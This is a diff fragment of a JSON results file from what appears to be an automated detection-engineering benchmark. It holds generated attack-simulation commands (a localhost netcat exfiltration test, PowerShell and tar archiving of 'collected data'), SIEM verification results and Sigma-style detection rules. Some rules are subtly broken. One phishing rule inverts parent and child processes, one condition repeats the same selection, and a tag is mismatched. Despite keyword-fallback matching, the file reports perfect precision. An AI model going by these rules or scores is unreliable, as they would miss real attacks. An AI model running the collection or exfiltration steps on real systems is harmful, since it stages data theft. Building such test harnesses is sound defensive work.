+      "generated_at": "2026-01-19T12:19:04.157446",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.627,
+      "validated": true
+    },
+    {
+      "id": "d28637be-0673-42a5-bfea-030524f2d886",
+      "ttp_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_id": "4a05e8be-9daa-4815-a194-605cfe2df862",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "tactic": "Exfiltration",
+      "platform": "linux",
+      "command": "echo 'test data' | nc -l 12345 > /dev/null & nc -w 3 localhost 12345 < /dev/null && echo 'Exfiltration complete' > $HOME/exfil_test.txt",
+      "description": "Advanced exfiltration simulation with confirmation, using netcat and file creation.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "This command sets up a local listener and sender using netcat, simulating data exfiltration over a C2 channel and writes a confirmation message to a file in the user's home directory.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:19:04.157446",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.627,
+      "validated": true
+    },
+    {
+      "id": "98b7c0a5-4b4a-4ac7-84d5-1ee48901fbe6",
+      "ttp_id": "ab469707-04d4-4d3f-9f1b-8299199fb385",
+      "technique_id": "ab469707-04d4-4d3f-9f1b-8299199fb385",
+      "technique_name": "Archive Collected Data",
+      "tactic": "Collection",
+      "platform": "windows",
+      "command": "powershell -Command \"Compress-Archive -Path '$env:TEMP\\testfile.txt' -DestinationPath '$env:TEMP\\testfile.zip' -Force\"",
+      "description": "Basic command to compress a test file into a ZIP archive using PowerShell.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "Creates a ZIP archive named 'testfile.zip' in the TEMP directory containing 'testfile.txt'.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:17:44.651562",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.624,
+      "validated": true
+    },
+    {
+      "id": "7dfd99cc-4e52-4a42-a5e9-6a66cc3e9825",
+      "ttp_id": "ab469707-04d4-4d3f-9f1b-8299199fb385",
+      "technique_id": "ab469707-04d4-4d3f-9f1b-8299199fb385",
+      "technique_name": "Archive Collected Data",
+      "tactic": "Collection",
+      "platform": "windows",
+      "command": "powershell -Command \"& { $files = Get-ChildItem -Path '$env:TEMP' -Filter '*.txt'; $zipPath = '$env:TEMP\\texts.zip'; Compress-Archive -Path $files.FullName -DestinationPath $zipPath -Force }\"",
+      "description": "Intermediate command to compress all text files in the TEMP directory into a ZIP archive using PowerShell.",
+      "requires_admin": false,
+      "safety_level": "high",
+      "expected_behavior": "Creates a ZIP archive named 'texts.zip' in the TEMP directory containing all '.txt' files.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:17:44.651562",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.624,
+      "validated": true
+    },
+    {
+      "id": "944a539f-3f67-4c41-98a4-a5aa6278b5f8",
+      "ttp_id": "ab469707-04d4-4d3f-9f1b-8299199fb385",
+      "technique_id": "ab469707-04d4-4d3f-9f1b-8299199fb385",
+      "technique_name": "Archive Collected Data",
+      "tactic": "Collection",
+      "platform": "linux",
+      "command": "tar -cvf collected_data.tar /path/to/data",
+      "description": "Basic command to archive files using tar without compression.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Creates an archive named 'collected_data.tar' containing the specified data files.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:19:04.157446",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.624,
+      "validated": true
+    },
+    {
+      "id": "57a4849c-6a3d-4116-9ad9-8c34b899bbc7",
+      "ttp_id": "ab469707-04d4-4d3f-9f1b-8299199fb385",
+      "technique_id": "ab469707-04d4-4d3f-9f1b-8299199fb385",
+      "technique_name": "Archive Collected Data",
+      "tactic": "Collection",
+      "platform": "linux",
+      "command": "tar -czvf collected_data.tar.gz /path/to/data",
+      "description": "Intermediate command to archive and compress files using tar with gzip.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Creates a compressed archive 'collected_data.tar.gz' containing the specified data files.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:19:04.157446",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.624,
+      "validated": true
+    },
+    {
+      "id": "380715fe-7c3d-4190-844f-68e9f8ea17d3",
+      "ttp_id": "ab469707-04d4-4d3f-9f1b-8299199fb385",
+      "technique_id": "ab469707-04d4-4d3f-9f1b-8299199fb385",
+      "technique_name": "Archive Collected Data",
+      "tactic": "Collection",
+      "platform": "linux",
+      "command": "mkdir -p /tmp/archive && tar -czvf /tmp/archive/collected_data.tar.gz /path/to/data",
+      "description": "Advanced command to create a temporary directory and archive data with compression.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Creates a temporary directory '/tmp/archive' and a compressed archive 'collected_data.tar.gz' containing the specified data files.",
+      "source": "langchain",
+      "generated_at": "2026-01-19T12:19:04.157446",
+      "agent_id": "2dbe247c-9dfa-45b8-90f4-c3d4164f12d9",
+      "confidence_score": 0.624,
+      "validated": true
+    }
+  ],
+  "siem_verification": [
+    {
+      "rule_id": "8c27b683-d5b3-496a-bc4e-c910bee03c87",
+      "ttp_id": "T1566",
+      "detected": true,
+      "events_found": 56,
+      "query_time_ms": 692.0000000000001,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+      "historical_events": 0
+    },
+    {
+      "rule_id": "37c20493-1422-420a-9aa8-62ca19317499",
+      "ttp_id": "T1543",
+      "detected": true,
+      "events_found": 12,
+      "query_time_ms": 748.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+      "historical_events": 0
+    },
+    {
+      "rule_id": "972125b0-01e0-47fe-be3a-38c2d940c795",
+      "ttp_id": "T1071",
+      "detected": true,
+      "events_found": 12,
+      "query_time_ms": 520.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+      "historical_events": 0
+    },
+    {
+      "rule_id": "b2ea8723-1b5f-43a0-bfe7-40a2a257904d",
+      "ttp_id": "T1041",
+      "detected": true,
+      "events_found": 18,
+      "query_time_ms": 501.0,
+      "status": "success",
+      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+      "historical_events": 0
+    },
+    {
+      "rule_id": "4ac8b54e-2440-4383-9c3e-0c9fd6137f7b",
+      "ttp_id": "T1560",
+      "detected": true,
+      "events_found": 2,
+      "query_time_ms": 625.0,
+      "status": "success",
+      "message": "Verification complete",
+      "historical_events": 0
+    }
+  ],
+  "siem_metrics": {
+    "true_positives": 5,
+    "false_positives": 0,
+    "false_negatives": 0,
+    "precision": 1.0,
+    "detection_rate": 1.0,
+    "f1_score": 1.0
+  },
+  "iterations": 1,
+  "final_score": 0.75,
+  "final_report": {
+    "total_ttps": 5,
+    "optimized_ttps": 5,
+    "generated_rules": 5,
+    "generated_attacks": 29,
+    "timestamp": "2026-01-19T19:21:22.270413"
+  },
+  "rule_history": [
+    {
+      "title": "Phishing Detection via Suspicious Office Processes",
+      "description": "Detects phishing activities by identifying Office processes spawning command shells, indicative of malicious behavior.",
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows",
+        "service": "sysmon"
+      },
+      "detection": {
+        "selection": {
+          "Image|endswith": "\\WINWORD.EXE",
+          "ParentImage|endswith": [
+            "\\cmd.exe",
+            "\\powershell.exe"
+          ]
+        },
+        "condition": "selection"
+      },
+      "falsepositives": [
+        "Legitimate use of Office applications for scripting or automation tasks.",
+        "Administrative tasks involving Office processes and command shells."
+      ],
+      "level": "high",
+      "tags": [
+        "attack.phishing"
+      ],
+      "ttp_id": "unknown",
+      "technique_name": "Phishing",
+      "generation_method": "langchain",
+      "id": "8c27b683-d5b3-496a-bc4e-c910bee03c87",
+      "siem_verification": {
+        "detected": true,
+        "status": "success",
+        "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+        "events_found": 56,
+        "query_time_ms": 692.0000000000001
+      },
+      "_iteration": 0,
+      "_score": 0.8,
+      "_is_initial": true
+    },
+    {
+      "title": "Detect Create or Modify System Process via NLP Pattern Matching",
+      "description": "Detects suspicious process creation activities indicative of the 'Create or Modify System Process' technique using NLP pattern matching.",
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows",
+        "service": "sysmon"
+      },
+      "detection": {
+        "selection": {
+          "Image|contains": "powershell.exe",
+          "CommandLine|contains": "Invoke-Expression"
+        },
+        "condition": "selection"
+      },
+      "falsepositives": [
+        "Administrative tasks using PowerShell for legitimate purposes",
+        "Scripted deployments using PowerShell"
+      ],
+      "level": "high",
+      "tags": [
+        "custom.attack",
+        "custom.persistence"
+      ],
+      "ttp_id": "unknown",
+      "technique_name": "Create or Modify System Process",
+      "generation_method": "langchain",
+      "id": "37c20493-1422-420a-9aa8-62ca19317499",
+      "siem_verification": {
+        "detected": true,
+        "status": "success",
+        "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+        "events_found": 12,
+        "query_time_ms": 748.0
+      },
+      "_iteration": 0,
+      "_score": 0.75,
+      "_is_initial": true
+    },
+    {
+      "title": "Detect Suspicious Application Layer Protocol Activity",
+      "description": "Detects potential Command and Control activity by identifying suspicious application layer protocol usage patterns in process creation events.",
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows",
+        "service": "sysmon"
+      },
+      "detection": {
+        "selection": {
+          "Image|endswith": "\\powershell.exe",
+          "CommandLine|contains": "-enc"
+        },
+        "condition": "selection"
+      },
+      "falsepositives": [
+        "Legitimate use of PowerShell for administrative tasks",
+        "Software updates using encoded commands"
+      ],
+      "level": "high",
+      "tags": [
+        "custom.attack"
+      ],
+      "ttp_id": "unknown",
+      "technique_name": "Application Layer Protocol",
+      "generation_method": "langchain",
+      "id": "972125b0-01e0-47fe-be3a-38c2d940c795",
+      "siem_verification": {
+        "detected": true,
+        "status": "success",
+        "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+        "events_found": 12,
+        "query_time_ms": 520.0
+      },
+      "_iteration": 0,
+      "_score": 0.725,
+      "_is_initial": true
+    },
+    {
+      "title": "Detect Exfiltration Over C2 Channel via PowerShell or CMD",
+      "description": "Detects potential exfiltration activities over C2 channels by monitoring for PowerShell or CMD processes with suspicious command-line arguments indicative of data encoding or transfer.",
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows",
+        "service": "sysmon"
+      },
+      "detection": {
+        "selection": {
+          "Image|endswith": "\\powershell.exe",
+          "CommandLine|contains": "Invoke-RestMethod"
+        },
+        "condition": "(selection and selection and selection and selection)"
+      },
+      "falsepositives": [
+        "Legitimate use of PowerShell or CMD for administrative tasks with similar command-line arguments.",
+        "Scripts that use encoding for benign purposes."
+      ],
+      "level": "high",
+      "tags": [
+        "attack.technique.t1204"
+      ],
+      "ttp_id": "unknown",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "generation_method": "langchain",
+      "id": "b2ea8723-1b5f-43a0-bfe7-40a2a257904d",
+      "siem_verification": {
+        "detected": true,
+        "status": "success",
+        "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+        "events_found": 18,
+        "query_time_ms": 501.0
+      },
+      "_iteration": 0,
+      "_score": 0.675,
+      "_is_initial": true
+    },
+    {
+      "title": "Detect Archive Collected Data via PowerShell",
+      "description": "Detects the use of PowerShell to archive collected data, indicative of the 'Archive Collected Data' technique under the MITRE ATT&CK Collection tactic.",
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows",
+        "service": "sysmon"
+      },
+      "detection": {
+        "selection": {
+          "Image|endswith": "\\powershell.exe",
+          "CommandLine|contains": "Compress-Archive"
+        },
+        "condition": "selection"
+      },
+      "falsepositives": [
+        "Legitimate use of PowerShell for system administration tasks involving archiving.",
+        "Scheduled tasks that use PowerShell to archive logs or backups."
+      ],
+      "level": "medium",
+      "tags": [
+        "attack.collection"
+      ],
+      "ttp_id": "unknown",
+      "technique_name": "Archive Collected Data",
+      "generation_method": "langchain",
+      "id": "4ac8b54e-2440-4383-9c3e-0c9fd6137f7b",
+      "siem_verification": {
+        "detected": true,
+        "status": "success",
+        "message": "Verification complete",
+        "events_found": 2,
+        "query_time_ms": 625.0
+      },
+      "_iteration": 0,
+      "_score": 0.8,
+      "_is_initial": true
+    }
+  ],
+  "timestamp": "2026-01-19T19:21:22.271458",
+  "benchmark_metrics": {
+    "duration_s": 350.9427897930145,
+    "quality_score": 0.6737224475997294
+  }
+}
